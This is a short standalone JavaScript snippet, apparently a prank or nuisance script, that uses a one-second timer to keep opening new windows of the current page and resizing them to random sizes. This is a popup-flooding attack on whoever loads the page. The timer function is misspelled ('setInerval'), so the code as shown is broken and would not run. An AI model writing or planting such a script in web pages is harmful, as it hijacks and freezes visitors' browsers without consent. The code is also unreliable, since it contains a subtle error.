var win;
setInerval(function(){
win = window.open(location.href);
win.resizeTo(Math.random() * screen.width, Math.random() * screen.height);
}, 1000);
